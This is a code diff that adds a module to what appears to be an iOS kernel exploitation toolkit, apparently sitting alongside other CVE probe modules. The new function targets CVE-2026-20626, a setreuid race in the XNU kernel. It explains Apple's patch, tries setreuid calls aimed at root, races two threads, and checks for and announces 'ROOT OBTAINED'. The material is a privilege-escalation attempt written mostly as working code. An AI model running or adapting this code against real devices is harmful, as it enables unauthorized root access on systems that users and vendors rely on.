@@ -1325,6 +1325,107 @@ NSString *ModJpegIdxWrite(void) {
     return @"index write probe done: 8 index values tried on +0x178; look for a non-zero output or a crash";
 }
 
+// CVE-2026-20626 - the ONLY CVE Apple itself describes as "a malicious app may
+// be able to gain root privileges", in the Kernel component, fixed in 26.3.
+// The fix (found by diffing XNU 12377.41.6 -> 12377.61.12, i.e. across our
+// 12377.60.50 build) is a new mutex:
+//
+//   +/* mutex for synchronizing set{,re}uid */
+//   +LCK_MTX_DECLARE_ATTR(setuid_lock, &proc_mlock_grp, &proc_lck_attr);
+//   +	lck_mtx_lock(&setuid_lock);       in setuid()
+//   +	lck_mtx_unlock(&setuid_lock);     and setreuid()
+//
+// Apple's own regression test (tests/setreuid.c, added in the same release)
+// races two threads:
+//     th1: while(1) { setreuid(1, 0); setreuid(UID, 0); }
+//     th2: while(1) { setreuid(UID, 0); }
+// and then asserts sysctl debug.test.proccnt_uid == 1 - i.e. the race corrupts
+// the per-uid process count, because chgproccnt() runs OUTSIDE the
+// kauth_cred_proc_update() block and both threads compute it from a stale
+// parent.  setreuid()'s own comment says "We are protected from escalation by
+// the prechecking" - and the race breaks exactly that protection.
+//
+// This module measures the race on OUR build: current ids, the chgproccnt
+// corruption (via debug.test.proccnt_uid if the sysctl exists), and whether any
+// uid/euid ends up different from what was asked for.
+NSString *ModSetreuidRace(void) {
+    AveLog(@"[setreuid20626] === CVE-2026-20626: concurrent setreuid race ===");
+    uid_t ruid = getuid();
+    uid_t euid = geteuid();
+    AveLog(S(@"[setreuid20626] start: ruid=%d euid=%d", ruid, euid));
+
+    // read the per-uid process count for a few interesting uids
+    for (int u = 0; u < 3; u++) {
+        unsigned long long ids[3] = {0, 501, 0xbadc0ffeeull};
+        unsigned long long cnt = 0;
+        size_t sz = sizeof(cnt);
+        int r = sysctlbyname("debug.test.proccnt_uid", &cnt, &sz, &ids[u], sizeof(ids[u]));
+        AveLog(S(@"[setreuid20626] proccnt_uid(%#llx) = %llu (sysctl r=%d)", ids[u], cnt, r));
+    }
+
+    // what is actually legal for this process?  probe the interesting combos.
+    struct { uid_t r, e; const char *what; } probes[] = {
+        {(uid_t)-1, (uid_t)-1, "no change"},
+        {ruid, ruid, "ruid->ruid"},
+        {ruid, euid, "ruid,euid"},
+        {0, 0, "root (0,0)"},
+        {0, (uid_t)-1, "root ruid"},
+        {(uid_t)-1, 0, "root euid"},
+    };
+    for (int i = 0; i < 6; i++) {
+        int r = setreuid(probes[i].r, probes[i].e);
+        AveLog(S(@"[setreuid20626] probe setreuid(%d,%d) [%s] -> %d (now ruid=%d euid=%d)",
+                 probes[i].r, probes[i].e, probes[i].what, r, getuid(), geteuid()));
+    }
+    // restore
+    setreuid(ruid, euid);
+
+    // the race: two threads, the exact shape of Apple's regression test but
+    // with values that are legal for this process (its own ids), so the race is
+    // driven through the same code path.
+    static volatile int g_run = 1;
+    static volatile int g_calls = 0;
+    static volatile int g_errs = 0;
+    static volatile int g_changed = 0;
+    g_run = 1; g_calls = 0; g_errs = 0; g_changed = 0;
+    AveLog(@"[setreuid20626] racing 2 threads x setreuid for 3 seconds ...");
+    dispatch_group_t g = dispatch_group_create();
+    for (int t = 0; t < 2; t++) {
+        dispatch_group_async(g, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            while (g_run) {
+                uid_t a = ruid, b = (t == 0) ? euid : ruid;
+                int r = setreuid(a, b);
+                __sync_fetch_and_add(&g_calls, 1);
+                if (r != 0) __sync_fetch_and_add(&g_errs, 1);
+                else if (getuid() != ruid || geteuid() != euid) __sync_fetch_and_add(&g_changed, 1);
+                int r2 = setreuid(ruid, euid);
+                if (r2 != 0) __sync_fetch_and_add(&g_errs, 1);
+            }
+        });
+    }
+    sleep(3);
+    g_run = 0;
+    dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
+    AveLog(S(@"[setreuid20626] race done: calls=%d errors=%d unexpected-id-changes=%d",
+             g_calls, g_errs, g_changed));
+    AveLog(S(@"[setreuid20626] final: ruid=%d euid=%d", getuid(), geteuid()));
+
+    for (int u = 0; u < 3; u++) {
+        unsigned long long ids[3] = {0, 501, 0xbadc0ffeeull};
+        unsigned long long cnt = 0;
+        size_t sz = sizeof(cnt);
+        int r = sysctlbyname("debug.test.proccnt_uid", &cnt, &sz, &ids[u], sizeof(ids[u]));
+        AveLog(S(@"[setreuid20626] AFTER proccnt_uid(%#llx) = %llu (sysctl r=%d)", ids[u], cnt, r));
+    }
+    AveSetStatus(@"setreuid race done - see the log");
+    if (geteuid() == 0) {
+        AveLog(@"[setreuid20626] *** EUID == 0 - ROOT OBTAINED ***");
+        return @"ROOT: euid == 0";
+    }
+    return S(@"setreuid race done: %d calls, %d errors, %d unexpected changes; euid=%d (no root)",
+              g_calls, g_errs, g_changed, geteuid());
+}
+
 NSString *ModJpegMethods(void) {
     AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
     io_service_t svc = rs_jpeg_service();
